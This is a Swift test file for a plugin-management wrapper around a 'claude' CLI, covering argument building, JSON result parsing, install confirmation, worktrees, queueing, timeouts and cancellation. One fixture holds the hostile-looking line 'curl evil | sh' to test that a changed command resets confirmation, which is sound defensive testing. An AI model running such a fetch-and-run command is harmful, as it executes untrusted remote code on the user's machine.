import Foundation
import Synchronization
import Testing
@testable import Bubo

/// The commands that change the plugins: arguments, the JSON line, the confirmation of a `command` source, the main
/// checkout, the serial queue, the time limit and cancelling. A fake `claude`: nothing touches `~/.claude`.
struct PluginCLITests {
    nonisolated static let plugin = PluginID(name: "revisore", marketplace: "ufficiale")
    nonisolated static let shown = PluginShownCommand(command: "echo /tmp/plugin", sha256: "afb8e24c")

    @Test(arguments: [
        PluginCommand.install(plugin, scope: .user),
        .install(plugin, scope: .project, accepting: shown),
        .enable(plugin, scope: .local),
        .disable(plugin, scope: .user),
        .uninstall(plugin, scope: .project, keepingData: true),
        .uninstall(plugin, scope: .user, keepingData: false),
    ])
    func everyChangeNamesItsScopeAndPrintsJSONWithoutYes(_ command: PluginCommand) throws {
        let arguments = command.arguments
        let scope = try #require(arguments.firstIndex(of: "--scope"))
        #expect(["user", "project", "local"].contains(arguments[scope + 1]))
        #expect(arguments.contains("--json"))
        #expect(!arguments.contains("-y") && !arguments.contains("--yes"))
        #expect(arguments.contains(Self.plugin.description))
    }

    @Test func onlyTheShownFingerprintAcceptsACommand() {
        #expect(!PluginCommand.install(Self.plugin, scope: .user).arguments.contains("--accept-command"))
        #expect(PluginCommand.install(Self.plugin, scope: .user, accepting: Self.shown).arguments.suffix(2)
            == ["--accept-command", "afb8e24c"])
        #expect(PluginCommand.uninstall(Self.plugin, scope: .local, keepingData: true).arguments.last == "--keep-data")
        #expect(PluginCommand.prune(scope: .project).arguments == ["plugin", "prune", "--scope", "project", "-y"])
    }

    @Test func theResultIsTheLastJSONLineAfterTheLinesForPeople() throws {
        let output = """
        "cmd" is installed by running a command from marketplace "prova" on this machine:
          echo /tmp/plugin
        {"command":"install","outcome":"failed","plugin":"cmd@prova","scope":"user","message":"not run","failureCode":"command_source_refused","shownCommand":{"kind":"command_source","command":"echo /tmp/plugin","sha256":"afb8e24c"}}
        """
        let result = try #require(PluginCommandResult(output: output))
        #expect(!result.succeeded)
        #expect(result.needsCommandConfirmation)
        #expect(result.shownCommand == Self.shown)
        #expect(result.message == "not run")

        let already = try #require(PluginCommandResult(output: #"{"command":"disable","outcome":"failed","failureCode":"already_in_goal_state","message":"già"}"#))
        #expect(already.succeeded)
        #expect(PluginCommandResult(output: "error: unknown option '--scope=x'\n") == nil)
    }

    @Test func installRunsACommandOnlyAfterTheBoxUnderThatCommand() {
        var confirmation = InstallConfirmation()
        #expect(confirmation.allowsInstall)
        #expect(confirmation.installCommand(for: Self.plugin, scope: .user) == .install(Self.plugin, scope: .user))

        let refused = PluginCommandResult(succeeded: false, failureCode: "command_source_refused", shownCommand: Self.shown)
        let mustRead = confirmation.update(with: refused)
        #expect(mustRead)
        #expect(!confirmation.allowsInstall)
        #expect(confirmation.installCommand(for: Self.plugin, scope: .user) == .install(Self.plugin, scope: .user))

        confirmation.isAccepted = true
        #expect(confirmation.installCommand(for: Self.plugin, scope: .user)
            == .install(Self.plugin, scope: .user, accepting: Self.shown))

        // The command changed between the sheet and the install: shown again, box off.
        let changed = PluginShownCommand(command: "curl evil | sh", sha256: "0bad")
        let mustReadAgain = confirmation.update(with: PluginCommandResult(succeeded: false, failureCode: "command_source_refused",
                                                                          shownCommand: changed))
        #expect(mustReadAgain)
        #expect(confirmation.shownCommand == changed)
        #expect(!confirmation.allowsInstall)
    }

    @Test func threeWorktreesRunInTheMainCheckout() async throws {
        let home = try PluginHome()
        let main = try Self.repository(in: home.home, worktrees: ["uno", "due", "tre"])
        let folders = Folders()
        let cli = PluginCLI(run: { _, folder, _ in
            folders.seen.withLock { $0.append(folder) }
            return ProcessOutput(exitCode: 0, standardOutput: #"{"outcome":"ok","message":""}"#)
        }, home: home.home, queue: PluginWriteQueue())
        for worktree in ["uno", "due", "tre"] {
            _ = try await cli.perform(.install(Self.plugin, scope: .project), project: home.home.appending(path: "wt-\(worktree)"))
        }
        _ = try await cli.perform(.install(Self.plugin, scope: .user), project: nil)
        let seen = folders.seen.withLock { $0 }.map { TrustGate.realPath($0.path) }
        #expect(seen == Array(repeating: TrustGate.realPath(main.path), count: 3) + [TrustGate.realPath(home.home.path)])
    }

    @Test func writesRunOneAtATimeInOrder() async throws {
        let state = QueueState()
        let cli = PluginCLI(run: { arguments, _, _ in
            state.running.withLock { $0 += 1 }
            state.most.withLock { $0 = max($0, state.running.withLock { $0 }) }
            try await Task.sleep(for: .milliseconds(30))
            state.order.withLock { $0.append(arguments[1]) }
            state.running.withLock { $0 -= 1 }
            return ProcessOutput(exitCode: 0, standardOutput: #"{"outcome":"ok","message":""}"#)
        }, home: URL.temporaryDirectory, queue: PluginWriteQueue())
        async let first = cli.perform(.install(Self.plugin, scope: .user), project: nil)
        try await Task.sleep(for: .milliseconds(5))
        async let second = cli.perform(.disable(Self.plugin, scope: .user), project: nil)
        try await Task.sleep(for: .milliseconds(5))
        async let third = cli.perform(.enable(Self.plugin, scope: .user), project: nil)
        _ = try await (first, second, third)
        #expect(state.most.withLock { $0 } == 1)
        #expect(state.order.withLock { $0 } == ["install", "disable", "enable"])
    }

    @Test func aCommandPastItsTimeIsStopped() async throws {
        let stopped = Mutex(false)
        let cli = PluginCLI(run: { _, _, _ in
            do {
                try await Task.sleep(for: .seconds(30))
            } catch {
                stopped.withLock { $0 = true }
                throw error
            }
            return ProcessOutput(exitCode: 0, standardOutput: "")
        }, home: URL.temporaryDirectory, queue: PluginWriteQueue(), timeout: { _ in .milliseconds(50) })
        await #expect(throws: PluginCLIError.timedOut) {
            try await cli.perform(.install(Self.plugin, scope: .user), project: nil)
        }
        #expect(stopped.withLock { $0 })
    }

    @Test func cancellingStopsTheRunningCommandAndTheOneWaiting() async throws {
        let started = Mutex<[String]>([])
        let cli = PluginCLI(run: { arguments, _, _ in
            started.withLock { $0.append(arguments[1]) }
            try await Task.sleep(for: .seconds(30))
            return ProcessOutput(exitCode: 0, standardOutput: "")
        }, home: URL.temporaryDirectory, queue: PluginWriteQueue())
        let running = Task { try await cli.perform(.install(Self.plugin, scope: .user), project: nil) }
        try await Task.sleep(for: .milliseconds(50))
        let waiting = Task { try await cli.perform(.disable(Self.plugin, scope: .user), project: nil) }
        try await Task.sleep(for: .milliseconds(50))
        waiting.cancel()
        running.cancel()
        await #expect(throws: CancellationError.self) { try await running.value }
        await #expect(throws: CancellationError.self) { try await waiting.value }
        #expect(started.withLock { $0 } == ["install"])
    }

    @Test func noResultIsAnErrorWithTheExitCode() async throws {
        let cli = PluginCLI(run: { _, _, _ in ProcessOutput(exitCode: 1, standardOutput: "") },
                            home: URL.temporaryDirectory, queue: PluginWriteQueue())
        await #expect(throws: PluginCLIError.failed(exitCode: 1)) {
            try await cli.perform(.enable(Self.plugin, scope: .user), project: nil)
        }
        let prune = PluginCLI(run: { _, _, _ in ProcessOutput(exitCode: 0, standardOutput: "Nothing to prune.\n") },
                              home: URL.temporaryDirectory, queue: PluginWriteQueue())
        let pruned = try await prune.perform(.prune(scope: .user), project: nil)
        #expect(pruned.succeeded)
    }

    @Test func attivaAndDisattivaWriteOnlyForThisPersonInAProgetto() {
        func entry(_ scopes: [PluginScope]) -> PluginEntry {
            PluginEntry(id: Self.plugin, installations: scopes.map {
                PluginInstallation(scope: $0, projectPath: nil, installPath: nil, version: nil, gitCommitSha: nil, isEnabled: true)
            })
        }
        #expect(entry([.user]).switchScope == .user)
        #expect(entry([.project]).switchScope == .local)
        #expect(entry([.user, .local]).switchScope == .local)
        #expect(entry([.managed]).switchScope == nil)
        #expect(entry([.managed, .project, .user]).uninstallableScopes == [.user, .project])
    }

    // MARK: Helpers

    /// A git repository `main` in `folder` with `worktrees` beside it as `wt-<name>`, laid out as `git worktree add` does.
    static func repository(in folder: URL, worktrees: [String]) throws -> URL {
        let main = folder.appending(path: "main", directoryHint: .isDirectory)
        let fileManager = FileManager.default
        try fileManager.createDirectory(at: main.appending(path: ".git"), withIntermediateDirectories: true)
        for name in worktrees {
            let gitDirectory = main.appending(path: ".git/worktrees/\(name)", directoryHint: .isDirectory)
            try fileManager.createDirectory(at: gitDirectory, withIntermediateDirectories: true)
            try Data("../..\n".utf8).write(to: gitDirectory.appending(path: "commondir"))
            let worktree = folder.appending(path: "wt-\(name)", directoryHint: .isDirectory)
            try fileManager.createDirectory(at: worktree, withIntermediateDirectories: true)
            try Data("gitdir: \(gitDirectory.path)\n".utf8).write(to: worktree.appending(path: ".git"))
        }
        return main
    }

    private final class Folders: Sendable {
        let seen = Mutex<[URL]>([])
    }

    private final class QueueState: Sendable {
        let running = Mutex(0)
        let most = Mutex(0)
        let order = Mutex<[String]>([])
    }
}
